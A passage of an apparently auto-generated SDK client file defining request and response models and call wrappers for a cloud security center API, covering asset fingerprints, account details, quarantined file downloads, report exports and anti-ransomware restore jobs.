  propertyTypeItems?: [ 
    {
      name?: string(name='Name', description='The name of the middleware type.', example='Docker Component'),
      type?: string(name='Type', description='The type of the middleware. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='docker_component'),
    }
  ](name='PropertyTypeItems', description='An array that consists of the middleware types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A839E8-70AE-591D-8D9E-C5419A22****'),
}

model DescribePropertyTypeScaItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyTypeScaItemResponseBody(name='body'),
}

/**
 * @summary Queries middleware types.
 *
 * @param request DescribePropertyTypeScaItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyTypeScaItemResponse
 */
async function describePropertyTypeScaItemWithOptions(request: DescribePropertyTypeScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyTypeScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyTypeScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries middleware types.
 *
 * @param request DescribePropertyTypeScaItemRequest
 * @return DescribePropertyTypeScaItemResponse
 */
async function describePropertyTypeScaItem(request: DescribePropertyTypeScaItemRequest): DescribePropertyTypeScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyTypeScaItemWithOptions(request, runtime);
}

model DescribePropertyUsageNewestRequest {
  type?: string(name='Type', example='user'),
}

model DescribePropertyUsageNewestResponseBody = {
  itemCount?: int32(name='ItemCount', example='5'),
  newestStatisticItems?: [ 
    {
      create?: long(name='Create', example='1566178646000'),
      name?: string(name='Name', example='root'),
    }
  ](name='NewestStatisticItems'),
  requestId?: string(name='RequestId'),
  type?: string(name='Type', example='user'),
}

model DescribePropertyUsageNewestResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyUsageNewestResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribePropertyUsageNewest is deprecated, please use Sas::2018-12-03::DescribeOnceTask instead.
 *
 * @summary 查询资产指纹用户创建时间统计
 *
 * @param request DescribePropertyUsageNewestRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyUsageNewestResponse
 */
// Deprecated
async function describePropertyUsageNewestWithOptions(request: DescribePropertyUsageNewestRequest, runtime: Util.RuntimeOptions): DescribePropertyUsageNewestResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUsageNewest',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribePropertyUsageNewest is deprecated, please use Sas::2018-12-03::DescribeOnceTask instead.
 *
 * @summary 查询资产指纹用户创建时间统计
 *
 * @param request DescribePropertyUsageNewestRequest
 * @return DescribePropertyUsageNewestResponse
 */
// Deprecated
async function describePropertyUsageNewest(request: DescribePropertyUsageNewestRequest): DescribePropertyUsageNewestResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUsageNewestWithOptions(request, runtime);
}

model DescribePropertyUsageTopRequest {
  type?: string(name='Type', description='The type of the asset fingerprint. Valid value:

*   **port**: port
*   **process**: process
*   **software**: software
*   **user**: account
*   **sca**: middleware

This parameter is required.', example='port'),
}

model DescribePropertyUsageTopResponseBody = {
  itemCount?: int32(name='ItemCount', description='The number of fingerprints.', example='5'),
  requestId?: string(name='RequestId', description='The request ID.', example='16AA5B62-A3C1-520B-B289-4BD971CC17AB'),
  topStatisticItems?: [ 
    {
      count?: int32(name='Count', description='The quantity.', example='1'),
      name?: string(name='Name', description='The statistical item.', example='openssl'),
    }
  ](name='TopStatisticItems', description='The statistical results.'),
  type?: string(name='Type', description='The type of the asset fingerprint. Valid value:

*   **port**: port
*   **process**: process
*   **software**: software
*   **user**: account
*   **sca**: middleware', example='sca'),
}

model DescribePropertyUsageTopResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyUsageTopResponseBody(name='body'),
}

/**
 * @summary Uses the asset fingerprints feature to obtain the statistics on top five most frequently detected ports, processes, software, accounts, or middleware.
 *
 * @description Only users who purchase the Enterprise or Ultimate edition of Security Center can call this operation.
 *
 * @param request DescribePropertyUsageTopRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyUsageTopResponse
 */
async function describePropertyUsageTopWithOptions(request: DescribePropertyUsageTopRequest, runtime: Util.RuntimeOptions): DescribePropertyUsageTopResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUsageTop',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Uses the asset fingerprints feature to obtain the statistics on top five most frequently detected ports, processes, software, accounts, or middleware.
 *
 * @description Only users who purchase the Enterprise or Ultimate edition of Security Center can call this operation.
 *
 * @param request DescribePropertyUsageTopRequest
 * @return DescribePropertyUsageTopResponse
 */
async function describePropertyUsageTop(request: DescribePropertyUsageTopRequest): DescribePropertyUsageTopResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUsageTopWithOptions(request, runtime);
}

model DescribePropertyUserDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether the fuzzy search by account name is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  isRoot?: string(name='IsRoot', description='Specifies whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  lastLoginTimeEnd?: long(name='LastLoginTimeEnd', description='The timestamp of the last logoff from the account. Unit: milliseconds.', example='164922523600'),
  lastLoginTimeStart?: long(name='LastLoginTimeStart', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='164922523600'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  user?: string(name='User', description='The name of the account to which the server belongs.', example='bin'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyUserDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      accountsExpirationDate?: string(name='AccountsExpirationDate', description='The date on which the account expires.', example='never'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp at which the last asset fingerprint collection is performed. Unit: milliseconds.', example='1649149566000'),
      groupNames?: [ string ](name='GroupNames', description='The details of the user groups to which the account belongs.'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      isCouldLogin?: int32(name='IsCouldLogin', description='Indicates whether the account is an interactive logon account. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isPasswdExpired?: int32(name='IsPasswdExpired', description='Indicates whether the password expires. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      isPasswdLocked?: int32(name='IsPasswdLocked', description='Indicates whether the password is locked. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      isRoot?: string(name='IsRoot', description='Indicates whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isSudoer?: int32(name='IsSudoer', description='Indicates whether the account is a sudo account. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isUserExpired?: int32(name='IsUserExpired', description='Indicates whether the account expires. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      lastLoginIp?: string(name='LastLoginIp', description='The source IP address of the last logon to the account.', example='192.168.XX.XX'),
      lastLoginTime?: string(name='LastLoginTime', description='The last logon time of the account.', example='2022-04-04 18:07:06'),
      lastLoginTimeDt?: long(name='LastLoginTimeDt', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='1649066826000'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='1649066826000'),
      passwordExpirationDate?: string(name='PasswordExpirationDate', description='The date on which the password of the account expires.', example='never'),
      status?: string(name='Status', description='This parameter is deprecated. You can ignore it.', example='**'),
      user?: string(name='User', description='The name of the account.', example='bin'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The details of asset fingerprints for the account.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='33A71BE3-2CC2-14CB-B460-33A1DD82953A'),
}

model DescribePropertyUserDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyUserDetailResponseBody(name='body'),
}

/**
 * @summary Queries the asset fingerprints for an account to which a server belongs.
 *
 * @param request DescribePropertyUserDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyUserDetailResponse
 */
async function describePropertyUserDetailWithOptions(request: DescribePropertyUserDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyUserDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.isRoot)) {
    query['IsRoot'] = request.isRoot;
  }
  if (!Util.isUnset(request.lastLoginTimeEnd)) {
    query['LastLoginTimeEnd'] = request.lastLoginTimeEnd;
  }
  if (!Util.isUnset(request.lastLoginTimeStart)) {
    query['LastLoginTimeStart'] = request.lastLoginTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the asset fingerprints for an account to which a server belongs.
 *
 * @param request DescribePropertyUserDetailRequest
 * @return DescribePropertyUserDetailResponse
 */
async function describePropertyUserDetail(request: DescribePropertyUserDetailRequest): DescribePropertyUserDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserDetailWithOptions(request, runtime);
}

model DescribePropertyUserItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='2'),
  user?: string(name='User', description='The information about the account.', example='adm'),
}

model DescribePropertyUserItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='114'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers that belong to the account.', example='384'),
      user?: string(name='User', description='The name of the account.', example='adm'),
    }
  ](name='PropertyItems', description='An array that consists of the account information returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='76068BE2-F9C4-4EDD-967B-F503B8CCDD3D'),
}

model DescribePropertyUserItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyUserItemResponseBody(name='body'),
}

/**
 * @summary Queries information about an account.
 *
 * @param request DescribePropertyUserItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyUserItemResponse
 */
async function describePropertyUserItemWithOptions(request: DescribePropertyUserItemRequest, runtime: Util.RuntimeOptions): DescribePropertyUserItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about an account.
 *
 * @param request DescribePropertyUserItemRequest
 * @return DescribePropertyUserItemResponse
 */
async function describePropertyUserItem(request: DescribePropertyUserItemRequest): DescribePropertyUserItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserItemWithOptions(request, runtime);
}

model DescribeQuaraFileDownloadInfoRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.

> If you do not specify this parameter, you cannot call the RollbackSuspEventQuaraFile operation to restore a quarantined file. You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.', example='123'),
}

model DescribeQuaraFileDownloadInfoResponseBody = {
  downloadUrl?: string(name='DownloadUrl', description='The URL that is used to download the file. The URL is valid for five minutes.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  md5?: string(name='Md5', description='The MD5 hash value of the quarantined file.', example='bb62ef1311bc564377a0378d3axxxxxx'),
  path?: string(name='Path', description='The file path.', example='/etc/test'),
  quaraFileId?: int32(name='QuaraFileId', description='The ID of the quarantined file.', example='123'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='29874225-EAAC-5415-8501-32DD20FXXXXX'),
  tag?: string(name='Tag', description='The tag that is added to the related alert.', example='6d4ff40a22b15c86adecf2aa48xxxxx'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model DescribeQuaraFileDownloadInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeQuaraFileDownloadInfoResponseBody(name='body'),
}

/**
 * @summary Queries the download information about a quarantined file.
 *
 * @param request DescribeQuaraFileDownloadInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeQuaraFileDownloadInfoResponse
 */
async function describeQuaraFileDownloadInfoWithOptions(request: DescribeQuaraFileDownloadInfoRequest, runtime: Util.RuntimeOptions): DescribeQuaraFileDownloadInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeQuaraFileDownloadInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the download information about a quarantined file.
 *
 * @param request DescribeQuaraFileDownloadInfoRequest
 * @return DescribeQuaraFileDownloadInfoResponse
 */
async function describeQuaraFileDownloadInfo(request: DescribeQuaraFileDownloadInfoRequest): DescribeQuaraFileDownloadInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeQuaraFileDownloadInfoWithOptions(request, runtime);
}

model DescribeReportExportRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

>  You can call the [ExportCustomizeReport](https://help.aliyun.com/document_detail/2842677.html) operation to query the ID.

This parameter is required.', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeReportExportResponseBody = {
  downloadUrl?: string(name='DownloadUrl', description='The download URL of the report.', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  exportDate?: string(name='ExportDate', description='The time when the report was exported.', example='2022-12-15'),
  exportId?: long(name='ExportId', description='The ID of the export task.', example='2'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task. Valid values:

*   **-1**: The export task fails.
*   **0**: The export task is being initialized.
*   **1**: The export task is being executed.
*   **2**: The export task is successful.', example='2'),
  reportId?: long(name='ReportId', description='The ID of the report.', example='377665'),
  requestId?: string(name='RequestId', description='The request ID.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  urlExpiredTime?: long(name='UrlExpiredTime', description='The timestamp when the download URL expires. Unit: milliseconds.', example='1660113647000'),
}

model DescribeReportExportResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeReportExportResponseBody(name='body'),
}

/**
 * @summary Queries the information about a report export task.
 *
 * @param request DescribeReportExportRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeReportExportResponse
 */
async function describeReportExportWithOptions(request: DescribeReportExportRequest, runtime: Util.RuntimeOptions): DescribeReportExportResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeReportExport',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a report export task.
 *
 * @param request DescribeReportExportRequest
 * @return DescribeReportExportResponse
 */
async function describeReportExport(request: DescribeReportExportRequest): DescribeReportExportResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeReportExportWithOptions(request, runtime);
}

model DescribeReportRecipientStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  recipients?: string(name='Recipients', description='The email address of the recipient. Separate multiple email addresses with commas (,).

This parameter is required.', example='username@example.com,username@example.com'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='39.174.xxx.xxx'),
}

model DescribeReportRecipientStatusResponseBody = {
  reportRecipientList?: [ 
    {
      isVerify?: int32(name='IsVerify', description='Indicates whether the email address is verified. Valid values:

*   0: no
*   1: yes

>  If no email is specified when you create a report, the value of this parameter is empty.', example='1'),
      recipient?: string(name='Recipient', description='The email address of the report recipient.

>  If no email is specified when you create a report, the value of this parameter is empty.', example='username@example.com'),
    }
  ](name='ReportRecipientList', description='The report recipients.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model DescribeReportRecipientStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeReportRecipientStatusResponseBody(name='body'),
}

/**
 * @summary Queries the status of a report recipient by using the security report feature of the System Configuration module in the Security Center console.
 *
 * @param request DescribeReportRecipientStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeReportRecipientStatusResponse
 */
async function describeReportRecipientStatusWithOptions(request: DescribeReportRecipientStatusRequest, runtime: Util.RuntimeOptions): DescribeReportRecipientStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.recipients)) {
    query['Recipients'] = request.recipients;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeReportRecipientStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status of a report recipient by using the security report feature of the System Configuration module in the Security Center console.
 *
 * @param request DescribeReportRecipientStatusRequest
 * @return DescribeReportRecipientStatusResponse
 */
async function describeReportRecipientStatus(request: DescribeReportRecipientStatusRequest): DescribeReportRecipientStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeReportRecipientStatusWithOptions(request, runtime);
}

model DescribeRestoreJobsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.

This parameter is required.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The unique identifier of the server on which the restoration task is run. For example, you can use the IP address or the name of the server.', example='1.1.XX.XX'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.

This parameter is required.', example='10'),
  status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task is created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='RUNNING'),
}

model DescribeRestoreJobsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of restoration tasks returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of restoration tasks returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
  restoreJobs?: [ 
    {
      actualBytes?: long(name='ActualBytes', description='The size of backup data. Unit: bytes.', example='20'),
      bytesDone?: long(name='BytesDone', description='The total size of data that is restored. Unit: bytes.', example='20'),
      bytesTotal?: long(name='BytesTotal', description='The total size of data that you want to restore. Unit: bytes.', example='20'),
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent that is used to perform the restoration task.', example='c-000frxwusjauhp9ajpu6'),
      completeTime?: long(name='CompleteTime', description='The timestamp when the restoration task is complete. Unit: milliseconds.', example='1583289054000'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the restoration task is created. Unit: milliseconds.', example='1583289052000'),
      duration?: long(name='Duration', description='The duration of the restoration task. Unit: seconds.', example='100'),
      errorCount?: long(name='ErrorCount', description='The number of the restoration tasks on which errors occur.', example='0'),
      errorFile?: string(name='ErrorFile', description='The name of the CSV file. The CSV file contains the files that fail to be restored.', example='s-000f4wxm8f7gur6g2otm.csv'),
      errorFileUrl?: string(name='ErrorFileUrl', description='The URL to download the CSV file. The CSV file contains the files that fail to be restored.', example='["/home/user"]'),
      errorType?: string(name='ErrorType', description='The error code that is returned for the restoration task.', example='NONE'),
      eta?: long(name='Eta', description='The timestamp when the in-progress restoration task is expected to be complete. Unit: seconds.', example='1583299054'),
      excludes?: string(name='Excludes', description='The directory excluded from the anti-ransomware policy. The value is the directory that you specify to skip protection when you create the anti-ransomware policy.', example='["/home/user"]'),
      exitCode?: string(name='ExitCode', description='The return value of the restoration task.', example='0'),
      gmtCreate?: string(name='GmtCreate', description='The time when the restoration task is created.', example='2021-04-25T19:11Z'),
      gmtModified?: string(name='GmtModified', description='The time when the restoration task is updated.', example='2021-04-25T19:11Z'),
      includes?: string(name='Includes', description='The directory in which the restored file is stored. The value is the directory that you specify for protection when you create the anti-ransomware policy', example='["/root/disk-uuid-test","/root/install.sh"]'),
      instanceId?: string(name='InstanceId', description='The ID of the server whose data you want to restore.', example='i-bp12xnvdax6307gw****'),
      instanceName?: string(name='InstanceName', description='The name of the server whose data you want to restore.', example='win2012-01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server whose data you want to restore.', example='1.1.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The internal IP address of the server whose data you want to restore.', example='2.1.XX.XX'),
      itemsDone?: long(name='ItemsDone', description='The number of files that are restored.', example='0'),
      itemsTotal?: long(name='ItemsTotal', description='The total number of files that need to be restored.', example='0'),
      message?: string(name='Message', description='The error message.', example='successful'),
      percentage?: int32(name='Percentage', description='The progress of the restoration task in percentage.', example='100'),
      requestId?: string(name='RequestId', description='The request ID.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
      restoreId?: string(name='RestoreId', description='The ID of the restoration task.', example='r-000gmcypy5dyf9ey3uv7'),
      restoreName?: string(name='RestoreName', description='The name of the restoration task.', example='Restore'),
      restoreType?: string(name='RestoreType', description='The type of the file that is restored. Valid values:

*   **ECS_FILE**: files on Elastic Compute Service (ECS) instances
*   **FILE**: files on servers in data centers', example='ECS_FILE'),
      snapshotHash?: string(name='SnapshotHash', description='The hash value of the snapshot that stores backup data when the data is backed up.', example='a3992de83f529b844135fe795d949181735a7d20e0ac8539485c61b7983e618f'),
      snapshotId?: string(name='SnapshotId', description='The hash value ID of the snapshot that stores backup data when the data is backed up.', example='s-000gmcypy5dy54e39yny'),
      snapshotVersion?: string(name='SnapshotVersion', description='The version of the backup data.', example='2020-03-03 18:00'),
      source?: string(name='Source', description='The restored content.', example='["/home/admin","\\\\\\\\\\\\\\\\servername\\\\\\\\sharename"]'),
      sourceClientId?: string(name='SourceClientId', description='The ID of the anti-ransomware agent that is used to back up data.', example='c-000gmcypy5dyf9ey3uv7'),
      speed?: long(name='Speed', description='The speed at which data is restored. Unit: byte/s.', example='25766558'),
      status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task was created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
